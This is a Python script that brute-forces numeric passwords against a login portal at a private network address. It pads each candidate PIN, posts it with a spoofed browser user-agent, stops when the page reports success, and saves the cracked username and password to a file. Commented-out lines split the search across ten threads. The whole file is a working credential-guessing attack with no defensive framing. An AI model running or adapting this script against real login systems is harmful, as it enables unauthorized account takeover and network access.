import requests, threading, time, random
reqs = requests.session()
url = "http://172.16.0.1/portal/user-authen.php"
header = {
    "content-type":"application/x-www-form-urlencoded",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"
}
def getRun():
    df = open('password_v2.txt', 'r', encoding='utf-8')
    return df.read()
def setRun(x):
    df = open('password_v2.txt', 'w',encoding='utf-8')
    df.writelines(str(x))
    df.close()
def result(x):
    df = open('password.txt', 'a',encoding='utf-8')
    df.writelines(str(x))
    df.close()
def BrutforcePassword(start,end,length):
    for i in range(start,end,+1):
        if getRun()=='0': return
        isLength = True
        password = str(i)
        while isLength:
            if getRun()=='0': return
            if(len(password)==length):
                isLength = False
                print(username,password)
            else:
                password = "0"+str(password)
        body = {
            "txtLogin":username,
            "txtPasswd":password,
            "btnLogin":"Login",
            "reqUrl":"",
            "reqCheck":"false"
        }
        try:
            res = reqs.post(url=url,headers=header,data=body)
            if "Login successfully" in res.text:
                print(f"Login successfully Password is ${password}")
                result(f'usename : {username}, password : {password}')
                setRun("0")
        except:
            pass
setRun("1")
title = ""
print(title)
username = input("username : ")
length = int(input("password length : "))
start = int(input("password start : "))
end = int(input("password end : "))
BrutforcePassword(start,end,length)


# threading.Thread(target=BrutforcePassword,args=(0,1000,4,)).start()
# threading.Thread(target=BrutforcePassword,args=(1000,2000,4,)).start()
# threading.Thread(target=BrutforcePassword,args=(2000,3000,4,)).start()
# threading.Thread(target=BrutforcePassword,args=(3000,4000,4,)).start()
# threading.Thread(target=BrutforcePassword,args=(4000,5000,4,)).start()
# threading.Thread(target=BrutforcePassword,args=(5000,6000,4,)).start()
# threading.Thread(target=BrutforcePassword,args=(6000,7000,4,)).start()
# threading.Thread(target=BrutforcePassword,args=(7000,8000,4,)).start()
# threading.Thread(target=BrutforcePassword,args=(8000,9000,4,)).start()
# threading.Thread(target=BrutforcePassword,args=(9000,10000,4,)).start()

# BrutforcePassword(0,5000,4)
# BrutforcePassword(5000,10000,4)